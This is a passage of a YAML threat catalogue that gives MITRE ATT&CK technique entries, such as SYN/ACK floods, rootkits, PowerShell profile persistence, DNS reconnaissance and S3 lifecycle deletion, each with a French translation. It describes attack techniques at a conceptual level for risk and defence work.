  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.001
    ref_id: T1499.001
    name: OS Exhaustion Flood
    description: 'Adversaries may launch a denial of service (DoS) attack targeting
      an endpoint''s operating system (OS). A system''s OS is responsible for managing
      the finite resources as well as preventing the entire system from being overwhelmed
      by excessive demands on its capacity. These attacks do not need to exhaust the
      actual resources on a system; the attacks may simply exhaust the limits and
      available resources that an OS self-imposes.


      Different ways to achieve this exist, including TCP state-exhaustion attacks
      such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018)
      With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP
      handshake is never completed. Because each OS has a maximum number of concurrent
      TCP connections that it will allow, this can quickly exhaust the ability of
      the system to receive new requests for TCP connections, thus preventing access
      to any TCP service provided by the server.(Citation: Cloudflare SynFlood)


      ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK
      packets are sent to the target. This forces the OS to search its state table
      for a related TCP connection that has already been established. Because the
      ACK packets are for connections that do not exist, the OS will have to search
      the entire state table to confirm that no match exists. When it is necessary
      to do this for a large flood of packets, the computational requirements can
      cause the server to become sluggish and/or unresponsive, due to the work it
      must do to eliminate the rogue ACK packets. This greatly reduces the resources
      available for providing the targeted service.(Citation: Corero SYN-ACKflood)

      https://attack.mitre.org/techniques/T1499/001'
    translations:
      fr:
        name: "Inondation d\u2019\xE9puisement du syst\xE8me d\u2019exploitation"
        description: "Les adversaires peuvent lancer une attaque par d\xE9ni de service\
          \ (DoS) ciblant le syst\xE8me d\u2019exploitation (OS) d\u2019un terminal.\
          \ Le syst\xE8me d\u2019exploitation d\u2019un syst\xE8me est charg\xE9 de\
          \ g\xE9rer les ressources limit\xE9es et d\u2019\xE9viter que l\u2019ensemble\
          \ du syst\xE8me ne soit submerg\xE9 par des demandes excessives sur sa capacit\xE9\
          . Ces attaques n\u2019ont pas besoin d\u2019\xE9puiser les ressources r\xE9\
          elles d\u2019un syst\xE8me ; les attaques peuvent simplement \xE9puiser\
          \ les limites et les ressources disponibles qu\u2019un syst\xE8me d\u2019\
          exploitation s\u2019impose lui-m\xEAme.\n\nIl existe diff\xE9rentes fa\xE7\
          ons d\u2019y parvenir, notamment les attaques d\u2019\xE9puisement d\u2019\
          \xE9tat TCP telles que les inondations SYN et les inondations ACK. (Citation\
          \ : Arbor AnnualDoSreport janvier 2018) Avec les inondations SYN, des quantit\xE9\
          s excessives de paquets SYN sont envoy\xE9es, mais l\u2019\xE9tablissement\
          \ de liaison TCP \xE0 3 voies n\u2019est jamais termin\xE9. \xC9tant donn\xE9\
          \ que chaque syst\xE8me d\u2019exploitation dispose d\u2019un nombre maximal\
          \ de connexions TCP simultan\xE9es qu\u2019il autorise, cela peut rapidement\
          \ \xE9puiser la capacit\xE9 du syst\xE8me \xE0 recevoir de nouvelles demandes\
          \ de connexions TCP, emp\xEAchant ainsi l\u2019acc\xE8s \xE0 tout service\
          \ TCP fourni par le serveur. (Citation : Cloudflare SynFlood)\n\nLes inondations\
          \ ACK exploitent la nature \xE9tatique du protocole TCP. Un flot de paquets\
          \ ACK est envoy\xE9 \xE0 la cible. Cela oblige le syst\xE8me d\u2019exploitation\
          \ \xE0 rechercher dans sa table d\u2019\xE9tat une connexion TCP associ\xE9\
          e qui a d\xE9j\xE0 \xE9t\xE9 \xE9tablie. \xC9tant donn\xE9 que les paquets\
          \ ACK concernent des connexions qui n\u2019existent pas, le syst\xE8me d\u2019\
          exploitation devra effectuer une recherche dans l\u2019int\xE9gralit\xE9\
          \ de la table d\u2019\xE9tat pour confirmer qu\u2019aucune correspondance\
          \ n\u2019existe. Lorsqu\u2019il est n\xE9cessaire de le faire pour un grand\
          \ nombre de paquets, les exigences de calcul peuvent entra\xEEner la lenteur\
          \ et/ou l\u2019inactivit\xE9 du serveur, en raison du travail qu\u2019il\
          \ doit effectuer pour \xE9liminer les paquets ACK non autoris\xE9s. Cela\
          \ r\xE9duit consid\xE9rablement les ressources disponibles pour fournir\
          \ le service cibl\xE9. (R\xE9f\xE9rence : Corero SYN-ACKflood)\nhttps://attack.mitre.org/techniques/T1499/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1014
    ref_id: T1014
    name: Rootkit
    description: "Adversaries may use rootkits to hide the presence of programs, files,\
      \ network connections, services, drivers, and other system components. Rootkits\
      \ are programs that hide the existence of malware by intercepting/hooking and\
      \ modifying operating system API calls that supply system information. (Citation:\
      \ Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality\
      \ may reside at the user or kernel level in the operating system or lower, to\
      \ include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001).\
      \ (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux,\
      \ and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat\
      \ Mac OSX Rootkit)\nhttps://attack.mitre.org/techniques/T1014"
    translations:
      fr:
        name: Rootkit
        description: "Les adversaires peuvent utiliser des rootkits pour masquer la\
          \ pr\xE9sence de programmes, de fichiers, de connexions r\xE9seau, de services,\
          \ de pilotes et d\u2019autres composants du syst\xE8me. Les rootkits sont\
          \ des programmes qui cachent l\u2019existence de logiciels malveillants\
          \ en interceptant/connectant et en modifiant les appels API du syst\xE8\
          me d\u2019exploitation qui fournissent des informations syst\xE8me. (Citation\
          \ : Rootkits Windows Symantec) \n\nLes rootkits ou les fonctionnalit\xE9\
          s d\u2019activation des rootkits peuvent r\xE9sider au niveau de l\u2019\
          utilisateur ou du noyau dans le syst\xE8me d\u2019exploitation ou \xE0 un\
          \ niveau inf\xE9rieur, pour inclure un hyperviseur, un enregistrement de\
          \ d\xE9marrage principal ou un [microprogramme syst\xE8me](https://attack.mitre.org/techniques/T1542/001).\
          \ (citation : Wikipedia rootkit) Les rootkits ont \xE9t\xE9 vus pour les\
          \ syst\xE8mes Windows, Linux et Mac OS X. (Citation : CrowdStrike Linux\
          \ Rootkit) (Citation : BlackHat Mac OSX Rootkit)\nhttps://attack.mitre.org/techniques/T1014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.013
    ref_id: T1546.013
    name: PowerShell Profile
    description: "Adversaries may gain persistence and elevate privileges by executing\
      \ malicious content triggered by PowerShell profiles. A PowerShell profile \
      \ (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ starts and can be used as a logon script to customize user environments.\n\
      \n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several\
      \ profiles depending on the user or host program. For example, there can be\
      \ different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ host programs such as the PowerShell console, PowerShell ISE or Visual Studio\
      \ Code. An administrator can also configure a profile that applies to all users\
      \ and host programs on the local computer. (Citation: Microsoft About Profiles)\
      \ \n\nAdversaries may modify these profiles to include arbitrary commands, functions,\
      \ modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ session the modified script will be executed unless the <code>-NoProfile</code>\
      \ flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019)\
      \ \n\nAn adversary may also be able to escalate privileges if a script in a\
      \ PowerShell profile is loaded and executed by an account with higher privileges,\
      \ such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)\n\
      https://attack.mitre.org/techniques/T1546/013"
    translations:
      fr:
        name: Profil PowerShell
        description: "Les adversaires peuvent obtenir de la persistance et des privil\xE8\
          ges \xE9lev\xE9s en ex\xE9cutant du contenu malveillant d\xE9clench\xE9\
          \ par des profils PowerShell. Un profil PowerShell (<code>profile.ps1</code>)\
          \ est un script qui s\u2019ex\xE9cute au d\xE9marrage de [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ et qui peut \xEAtre utilis\xE9 comme script d\u2019ouverture de session\
          \ pour personnaliser les environnements utilisateur.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ Prend en charge plusieurs profils en fonction de l\u2019utilisateur ou\
          \ du programme h\xF4te. Par exemple, il peut exister diff\xE9rents profils\
          \ pour les programmes h\xF4tes [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ tels que la console PowerShell, PowerShell ISE ou Visual Studio Code.\
          \ Un administrateur peut \xE9galement configurer un profil qui s\u2019applique\
          \ \xE0 tous les utilisateurs et programmes h\xF4tes sur l\u2019ordinateur\
          \ local. (Citation : Microsoft \xE0 propos des profils) \n\nLes adversaires\
          \ peuvent modifier ces profils pour inclure des commandes, des fonctions,\
          \ des modules et/ou des lecteurs [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ arbitraires afin d\u2019obtenir une persistance. Chaque fois qu\u2019\
          un utilisateur ouvre une session [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
          \ le script modifi\xE9 est ex\xE9cut\xE9, sauf si l\u2019indicateur <code>-NoProfile</code>\
          \ est utilis\xE9 lors de son lancement. (Citation : ESET Turla PowerShell\
          \ mai 2019) \n\nUn adversaire peut \xE9galement \xEAtre en mesure d\u2019\
          \xE9lever les privil\xE8ges si un script dans un profil PowerShell est charg\xE9\
          \ et ex\xE9cut\xE9 par un compte disposant de privil\xE8ges plus \xE9lev\xE9\
          s, tel qu\u2019un administrateur de domaine. (Citation : Wits End et profils\
          \ PowerShell louches)\nhttps://attack.mitre.org/techniques/T1546/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.007
    ref_id: T1059.007
    name: JavaScript
    description: "Adversaries may abuse various implementations of JavaScript for\
      \ execution. JavaScript (JS) is a platform-independent scripting language (compiled\
      \ just-in-time at runtime) commonly associated with scripts in webpages, though\
      \ JS can be executed in runtime environments outside the browser.(Citation:\
      \ NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard.\
      \ JScript is interpreted via the Windows Script engine and thus integrated with\
      \ many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001)\
      \ and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation:\
      \ Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript\
      \ for Automation (JXA) is a macOS scripting language based on JavaScript, included\
      \ as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced\
      \ in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control\
      \ applications, interface with the operating system, and bridge access into\
      \ the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports\
      \ two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002).\
      \ Scripts can be executed via the command line utility <code>osascript</code>,\
      \ they can be compiled into applications or script files via <code>osacompile</code>,\
      \ and they can be compiled and executed in memory of other programs by leveraging\
      \ the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation:\
      \ SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary\
      \ Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries\
      \ may abuse various implementations of JavaScript to execute various behaviors.\
      \ Common uses include hosting malicious scripts on websites as part of a [Drive-by\
      \ Compromise](https://attack.mitre.org/techniques/T1189) or downloading and\
      \ executing these script files as secondary payloads. Since these payloads are\
      \ text-based, it is also very common for adversaries to obfuscate their content\
      \ as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\
      https://attack.mitre.org/techniques/T1059/007"
    translations:
      fr:
        name: Javascript
        description: "Les adversaires peuvent abuser de diverses impl\xE9mentations\
          \ de JavaScript pour l\u2019ex\xE9cution. JavaScript (JS) est un langage\
          \ de script ind\xE9pendant de la plate-forme (compil\xE9 juste-\xE0-temps\
          \ au moment de l\u2019ex\xE9cution) g\xE9n\xE9ralement associ\xE9 aux scripts\
          \ des pages Web, bien que JS puisse \xEAtre ex\xE9cut\xE9 dans des environnements\
          \ d\u2019ex\xE9cution en dehors du navigateur. (Citation : NodeJS)\n\nJScript\
          \ est l\u2019impl\xE9mentation Microsoft de la m\xEAme norme de script.\
          \ JScript est interpr\xE9t\xE9 via le moteur de script Windows et donc int\xE9\
          gr\xE9 \xE0 de nombreux composants de Windows tels que les pages [Component\
          \ Object Model](https://attack.mitre.org/techniques/T1559/001) et Internet\
          \ Explorer HTML Application (HTA). (Citation : JScrip mai 2018)(Citation\
          \ : Microsoft JScript 2007)(Citation : Scripts Microsoft Windows)\n\nJavaScript\
          \ for Automation (JXA) est un langage de script macOS bas\xE9 sur JavaScript,\
          \ inclus dans l\u2019architecture Open Scripting Architecture (OSA) d\u2019\
          Apple, qui a \xE9t\xE9 introduit dans OSX 10.10. L\u2019OSA d\u2019Apple\
          \ fournit des capacit\xE9s de script pour contr\xF4ler les applications,\
          \ s\u2019interfacer avec le syst\xE8me d\u2019exploitation et faire le lien\
          \ entre l\u2019acc\xE8s au reste des API internes d\u2019Apple. \xC0 partir\
          \ d\u2019OSX 10.10, OSA ne prend en charge que deux langues, JXA et [AppleScript](https://attack.mitre.org/techniques/T1059/002).\
          \ Les scripts peuvent \xEAtre ex\xE9cut\xE9s via l\u2019utilitaire de ligne\
          \ de commande <code>osascript</code>, ils peuvent \xEAtre compil\xE9s dans\
          \ des applications ou des fichiers de script via <code>osacompile</code>,\
          \ et ils peuvent \xEAtre compil\xE9s et ex\xE9cut\xE9s en m\xE9moire d\u2019\
          autres programmes en exploitant le framework OSAKit. (Citation\_: Apple\
          \ \xC0 propos de Mac Scripting 2016)(Citation : SpecterOps JXA 2020)(Citation\
          \ : SentinelOne macOS Red Team)(Citation : Moineau argent\xE9 Red Canary,\
          \ f\xE9vrier 2021)(Citation : MDSec macOS JXA et VSCode)\n\nLes adversaires\
          \ peuvent abuser de diverses impl\xE9mentations de JavaScript pour ex\xE9\
          cuter divers comportements. Les utilisations courantes incluent l\u2019\
          h\xE9bergement de scripts malveillants sur des sites Web dans le cadre d\u2019\
          une [compromission intempestive](https://attack.mitre.org/techniques/T1189)\
          \ ou le t\xE9l\xE9chargement et l\u2019ex\xE9cution de ces fichiers de script\
          \ en tant que charges utiles secondaires. \xC9tant donn\xE9 que ces charges\
          \ utiles sont bas\xE9es sur du texte, il est \xE9galement tr\xE8s courant\
          \ que des adversaires obscurcissent leur contenu dans le cadre de [Fichiers\
          \ ou informations obscurcis](https://attack.mitre.org/techniques/T1027).\n\
          https://attack.mitre.org/techniques/T1059/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.002
    ref_id: T1590.002
    name: DNS
    description: "Adversaries may gather information about the victim's DNS that can\
      \ be used during targeting. DNS information may include a variety of details,\
      \ including registered name servers as well as records that outline addressing\
      \ for a target\u2019s subdomains, mail servers, and other hosts. DNS MX, TXT,\
      \ and SPF records may also reveal the use of third party cloud and SaaS providers,\
      \ such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf\
      \ Twitter DNS Records)\n\nAdversaries may gather this information in various\
      \ ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001).\
      \ DNS information may also be exposed to adversaries via online or other accessible\
      \ data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:\
      \ DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may\
      \ reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical\
      \ Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593),\
      \ or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing\
      \ operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
      \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
      \ and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\
      \nAdversaries may also use DNS zone transfer (DNS query type AXFR) to collect\
      \ all records from a misconfigured DNS server.(Citation: Trails-DNS)(Citation:\
      \ DNS-CISA)(Citation: Alexa-dns)\nhttps://attack.mitre.org/techniques/T1590/002"
    translations:
      fr:
        name: DNS
        description: "Les adversaires peuvent recueillir des informations sur le DNS\
          \ de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage. Les informations\
          \ DNS peuvent inclure divers d\xE9tails, y compris des serveurs de noms\
          \ enregistr\xE9s ainsi que des enregistrements qui d\xE9crivent l\u2019\
          adressage pour les sous-domaines, les serveurs de messagerie et autres h\xF4\
          tes d\u2019une cible. Les enregistrements DNS MX, TXT et SPF peuvent \xE9\
          galement r\xE9v\xE9ler l\u2019utilisation de fournisseurs de cloud et de\
          \ SaaS tiers, tels qu\u2019Office 365, G Suite, Salesforce ou Zendesk. (Citation\
          \ : Sean Metcalf Twitter DNS records)\n\nLes adversaires peuvent collecter\
          \ ces informations de diff\xE9rentes mani\xE8res, par exemple en interrogeant\
          \ ou en collectant des d\xE9tails via [DNS/DNS passif](https://attack.mitre.org/techniques/T1596/001).\
          \ Les informations DNS peuvent \xE9galement \xEAtre expos\xE9es \xE0 des\
          \ adversaires via des ensembles de donn\xE9es en ligne ou d\u2019autres\
          \ ensembles de donn\xE9es accessibles (ex : [Rechercher dans des bases de\
          \ donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)).\
          \ (Citation : benne \xE0 ordures DNS)(Citation : Circl DNS passif) La collecte\
          \ de ces informations peut r\xE9v\xE9ler des possibilit\xE9s pour d\u2019\
          autres formes de reconnaissance (ex : [Recherche dans des bases de donn\xE9\
          es techniques ouvertes](https://attack.mitre.org/techniques/T1596), [Recherche\
          \ dans des sites Web/domaines ouverts](https://attack.mitre.org/techniques/T1593)\
          \ ou [Analyse active](https://attack.mitre.org/techniques/T1595)), l\u2019\
          \xE9tablissement de ressources op\xE9rationnelles (ex : [Acquisition d\u2019\
          infrastructure](https://attack.mitre.org/techniques/T1583) ou [Compromission\
          \ d\u2019infrastructure]( https://attack.mitre.org/techniques/T1584)), et/ou\
          \ l\u2019acc\xE8s initial (ex : [Services \xE0 distance externes](https://attack.mitre.org/techniques/T1133)).\n\
          \nLes adversaires peuvent \xE9galement utiliser le transfert de zone DNS\
          \ (requ\xEAte DNS de type AXFR) pour collecter tous les enregistrements\
          \ d\u2019un serveur DNS mal configur\xE9. (Citation : Trails-DNS)(Citation\
          \ : DNS-CISA)(Citation : Alexa-dns)\nhttps://attack.mitre.org/techniques/T1590/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1485.001
    ref_id: T1485.001
    name: Lifecycle-Triggered Deletion
    description: "Adversaries may modify the lifecycle policies of a cloud storage\
      \ bucket to destroy all objects stored within.  \n\nCloud storage buckets often\
      \ allow users to set lifecycle policies to automate the migration, archival,\
      \ or deletion of objects after a set period of time.(Citation: AWS Storage Lifecycles)(Citation:\
      \ GCP Storage Lifecycles)(Citation: Azure Storage Lifecycles) If a threat actor\
      \ has sufficient permissions to modify these policies, they may be able to delete\
      \ all objects at once. \n\nFor example, in AWS environments, an adversary with\
      \ the `PutLifecycleConfiguration` permission may use the `PutBucketLifecycle`\
      \ API call to apply a lifecycle policy to an S3 bucket that deletes all objects\
      \ in the bucket after one day.(Citation: Palo Alto Cloud Ransomware) In addition\
      \ to destroying data for purposes of extortion and [Financial Theft](https://attack.mitre.org/techniques/T1657),\
      \ adversaries may also perform this action on buckets storing cloud logs for\
      \ [Indicator Removal](https://attack.mitre.org/techniques/T1070).(Citation:\
      \ Datadog S3 Lifecycle CloudTrail Logs)\nhttps://attack.mitre.org/techniques/T1485/001"
    translations:
      fr:
        name: "Suppression d\xE9clench\xE9e par le cycle de vie"
        description: "Les adversaires peuvent modifier les politiques de cycle de\
          \ vie d\u2019un compartiment de stockage cloud pour d\xE9truire tous les\
          \ objets qui y sont stock\xE9s.  \n\nLes compartiments de stockage dans\
          \ le cloud permettent souvent aux utilisateurs de d\xE9finir des politiques\
          \ de cycle de vie pour automatiser la migration, l\u2019archivage ou la\
          \ suppression d\u2019objets apr\xE8s une p\xE9riode de temps d\xE9finie.\
          \ (R\xE9f\xE9rence : Cycles de vie du stockage AWS)(Citation : Cycles de\
          \ vie du stockage GCP)(Citation : Cycles de vie du stockage Azure) Si un\
          \ auteur de menace dispose des autorisations suffisantes pour modifier ces\
          \ politiques, il peut \xEAtre en mesure de supprimer tous les objets en\
          \ m\xEAme temps. \n\nPar exemple, dans les environnements AWS, un adversaire\
          \ disposant de l\u2019autorisation \xAB PutLifecycleConfiguration \xBB peut\
          \ utiliser l\u2019appel d\u2019API \xAB PutBucketLifecycle \xBB pour appliquer\
          \ une politique de cycle de vie \xE0 un compartiment S3 qui supprime tous\
          \ les objets du compartiment au bout d\u2019un jour. (Citation : Ransomware\
          \ de Palo Alto Cloud) Outre la destruction de donn\xE9es \xE0 des fins d\u2019\
          extorsion et de [vol financier](https://attack.mitre.org/techniques/T1657),\
          \ les adversaires peuvent \xE9galement effectuer cette action sur des compartiments\
          \ stockant des journaux cloud pour [Suppression de l\u2019indicateur](https://attack.mitre.org/techniques/T1070).\
          \ (R\xE9f\xE9rence : Datadog S3 Lifecycle CloudTrail Logs)\nhttps://attack.mitre.org/techniques/T1485/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1123
    ref_id: T1123
    name: Audio Capture
    description: 'An adversary can leverage a computer''s peripheral devices (e.g.,
      microphones and webcams) or applications (e.g., voice and video call services)
      to capture audio recordings for the purpose of listening into sensitive conversations
      to gather information.(Citation: ESET Attor Oct 2019)


      Malware or scripts may be used to interact with the devices through an available
      API provided by the operating system or an application to capture audio. Audio
      files may be written to disk and exfiltrated later.

      https://attack.mitre.org/techniques/T1123'
    translations:
      fr:
        name: Audio Capture
        description: "Un adversaire peut exploiter les p\xE9riph\xE9riques d\u2019\
          un ordinateur (par exemple, les microphones et les webcams) ou les applications\
          \ (par exemple, les services d\u2019appels vocaux et vid\xE9o) pour capturer\
          \ des enregistrements audio dans le but d\u2019\xE9couter des conversations\
          \ sensibles afin de recueillir des informations. (Citation : ESET Attor\
          \ octobre 2019)\n\nDes logiciels malveillants ou des scripts peuvent \xEA\
          tre utilis\xE9s pour interagir avec les appareils via une API disponible\
          \ fournie par le syst\xE8me d\u2019exploitation ou une application de capture\
          \ audio. Les fichiers audio peuvent \xEAtre \xE9crits sur le disque et exfiltr\xE9\
          s ult\xE9rieurement.\nhttps://attack.mitre.org/techniques/T1123"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543
    ref_id: T1543
    name: Create or Modify System Process
    description: "Adversaries may create or modify system-level processes to repeatedly\
      \ execute malicious payloads as part of persistence. When operating systems\
      \ boot up, they can start processes that perform background system functions.\
      \ On Windows and Linux, these system processes are referred to as services.(Citation:\
      \ TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)\
      \ and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run\
      \ to finish system initialization and load user specific parameters.(Citation:\
      \ AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services,\
      \ daemons, or agents that can be configured to execute at startup or a repeatable\
      \ interval in order to establish persistence. Similarly, adversaries may modify\
      \ existing services, daemons, or agents to achieve the same effect.  \n\nServices,\
      \ daemons, or agents may be created with administrator privileges but executed\
      \ under root/SYSTEM privileges. Adversaries may leverage this functionality\
      \ to create or modify system processes in order to escalate privileges.(Citation:\
      \ OSX Malware Detection)\nhttps://attack.mitre.org/techniques/T1543"
    translations:
      fr:
        name: "Cr\xE9ation ou modification d\u2019un processus syst\xE8me"
        description: "Les adversaires peuvent cr\xE9er ou modifier des processus au\
          \ niveau du syst\xE8me pour ex\xE9cuter de mani\xE8re r\xE9p\xE9t\xE9e des\
          \ charges utiles malveillantes dans le cadre de la persistance. Lorsque\
          \ les syst\xE8mes d\u2019exploitation d\xE9marrent, ils peuvent d\xE9marrer\
          \ des processus qui ex\xE9cutent des fonctions syst\xE8me en arri\xE8re-plan.\
          \ Sous Windows et Linux, ces processus syst\xE8me sont appel\xE9s services.\
          \ (Citation : TechNet Services) Sous macOS, les processus launchd connus\
          \ sous le nom de [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)\
          \ et [Launch Agent](https://attack.mitre.org/techniques/T1543/001) sont\
          \ ex\xE9cut\xE9s pour terminer l\u2019initialisation du syst\xE8me et charger\
          \ les param\xE8tres sp\xE9cifiques \xE0 l\u2019utilisateur. (Citation :\
          \ d\xE9mons de l\u2019agent de lancement AppleDocs) \n\nLes adversaires\
          \ peuvent installer de nouveaux services, d\xE9mons ou agents qui peuvent\
          \ \xEAtre configur\xE9s pour s\u2019ex\xE9cuter au d\xE9marrage ou \xE0\
          \ un intervalle reproductible afin d\u2019\xE9tablir la persistance. De\
          \ m\xEAme, les adversaires peuvent modifier des services, des d\xE9mons\
          \ ou des agents existants pour obtenir le m\xEAme effet.  \n\nLes services,\
          \ les d\xE9mons ou les agents peuvent \xEAtre cr\xE9\xE9s avec des privil\xE8\
          ges d\u2019administrateur, mais ex\xE9cut\xE9s avec des privil\xE8ges root/SYSTEM.\
          \ Les adversaires peuvent exploiter cette fonctionnalit\xE9 pour cr\xE9\
          er ou modifier des processus syst\xE8me afin d\u2019\xE9lever les privil\xE8\
          ges. (Citation : D\xE9tection des logiciels malveillants OSX)\nhttps://attack.mitre.org/techniques/T1543"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1133
    ref_id: T1133
    name: External Remote Services
    description: "Adversaries may leverage external-facing remote services to initially\
      \ access and/or persist within a network. Remote services such as VPNs, Citrix,\
      \ and other access mechanisms allow users to connect to internal enterprise\
      \ network resources from external locations. There are often remote service\
      \ gateways that manage connections and credential authentication for these services.\
      \ Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)\
      \ and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used\
      \ externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to\
      \ [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service\
      \ is often a requirement, which could be obtained through credential pharming\
      \ or by obtaining the credentials from users after compromising the enterprise\
      \ network.(Citation: Volexity Virtual Private Keylogging) Access to remote services\
      \ may be used as a redundant or persistent access mechanism during an operation.\n\
      \nAccess may also be gained through an exposed service that doesn\u2019t require\
      \ authentication. In containerized environments, this may include an exposed\
      \ Docker API, Kubernetes API server, kubelet, or web application such as the\
      \ Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation:\
      \ Unit 42 Hildegard Malware)\nhttps://attack.mitre.org/techniques/T1133"
    translations:
      fr:
        name: "Services \xE0 distance externes"
        description: "Les adversaires peuvent tirer parti de services \xE0 distance\
          \ externes pour acc\xE9der initialement \xE0 un r\xE9seau et/ou y persister.\
          \ Les services \xE0 distance tels que les VPN, Citrix et d\u2019autres m\xE9\
          canismes d\u2019acc\xE8s permettent aux utilisateurs de se connecter aux\
          \ ressources du r\xE9seau interne de l\u2019entreprise \xE0 partir d\u2019\
          emplacements externes. Il existe souvent des passerelles de service distantes\
          \ qui g\xE8rent les connexions et l\u2019authentification des informations\
          \ d\u2019identification pour ces services. Des services tels que [Windows\
          \ Remote Management](https://attack.mitre.org/techniques/T1021/006) et [VNC](https://attack.mitre.org/techniques/T1021/005)\
          \ peuvent \xE9galement \xEAtre utilis\xE9s en externe. (Citation : Logiciel\
          \ MacOS VNC pour le bureau \xE0 distance)\n\nL\u2019acc\xE8s \xE0 [Comptes\
          \ valides](https://attack.mitre.org/techniques/T1078) pour utiliser le service\
          \ est souvent une exigence, qui peut \xEAtre obtenue par le biais du pharming\
          \ d\u2019identifiants ou en obtenant les identifiants des utilisateurs apr\xE8\
          s avoir compromis le r\xE9seau d\u2019entreprise. (Citation : Volexity Virtual\
          \ Private Keylogging) L\u2019acc\xE8s aux services distants peut \xEAtre\
          \ utilis\xE9 comme m\xE9canisme d\u2019acc\xE8s redondant ou persistant\
          \ au cours d\u2019une op\xE9ration.\n\nL\u2019acc\xE8s peut \xE9galement\
          \ \xEAtre obtenu par le biais d\u2019un service expos\xE9 qui ne n\xE9cessite\
          \ pas d\u2019authentification. Dans les environnements conteneuris\xE9s,\
          \ il peut s\u2019agir d\u2019une API Docker expos\xE9e, d\u2019un serveur\
          \ d\u2019API Kubernetes, d\u2019un kubelet ou d\u2019une application web\
          \ telle que le tableau de bord Kubernetes. (Citation : Trend Micro Exposed\
          \ Docker Server)(Citation : Unit\xE9 42 Hildegard Malware)\nhttps://attack.mitre.org/techniques/T1133"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.006
    ref_id: T1546.006
    name: LC_LOAD_DYLIB Addition
    description: "Adversaries may establish persistence by executing malicious content\
      \ triggered by the execution of tainted binaries. Mach-O binaries have a series\
      \ of headers that are used to perform certain operations when a binary is loaded.\
      \ The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic\
      \ libraries (dylibs) to load during execution time. These can be added ad-hoc\
      \ to the compiled binary as long as adjustments are made to the rest of the\
      \ fields and dependencies.(Citation: Writing Bad Malware for OSX) There are\
      \ tools available to perform these changes.\n\nAdversaries may modify Mach-O\
      \ binary headers to load and execute malicious dylibs every time the binary\
      \ is executed. Although any changes will invalidate digital signatures on binaries\
      \ because the binary is being modified, this can be remediated by simply removing\
      \ the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019\
      t checked at load time.(Citation: Malware Persistence on OS X)\nhttps://attack.mitre.org/techniques/T1546/006"
    translations:
      fr:
        name: LC_LOAD_DYLIB Addition
        description: "Les adversaires peuvent \xE9tablir la persistance en ex\xE9\
          cutant du contenu malveillant d\xE9clench\xE9 par l\u2019ex\xE9cution de\
          \ fichiers binaires corrompus. Les binaires Mach-O ont une s\xE9rie d\u2019\
          en-t\xEAtes qui sont utilis\xE9s pour effectuer certaines op\xE9rations\
